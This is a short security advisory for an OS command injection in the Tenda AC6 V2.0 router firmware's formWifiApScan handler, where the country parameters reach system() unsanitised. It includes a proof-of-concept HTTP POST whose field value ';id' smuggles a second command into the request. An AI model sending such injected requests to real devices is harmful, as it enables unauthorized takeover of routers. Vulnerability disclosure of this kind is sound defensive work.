## Tenda AC6V2 formWifiApScan Command Injection via country parameter

### Title

```
Tenda AC6 V2.0 formWifiApScan Command Injection via country parameter
```

### Vendor / Product / Version

```
Tenda / AC6 V2.0 (AC1206) / Firmware V15.03.06.23
```

### Component

```
/bin/httpd — formWifiApScan handler (0x4b1914)
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
An OS command injection vulnerability exists in the formWifiApScan
function (0x4b1914) of /bin/httpd in Tenda AC6 V2.0 firmware V15.03.06.23.

The function reads the "wl2g.public.country" and "wl5g.public.country"
parameters via websGetVar() and passes them to doSystemCmd("rm %s"),
which calls system(). No input sanitization is performed.

No known CVE covers this vulnerability.
```

### Proof of Concept

```http
POST /goform/WifiApScan HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

wl2g.public.country=;id
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution engine.
```

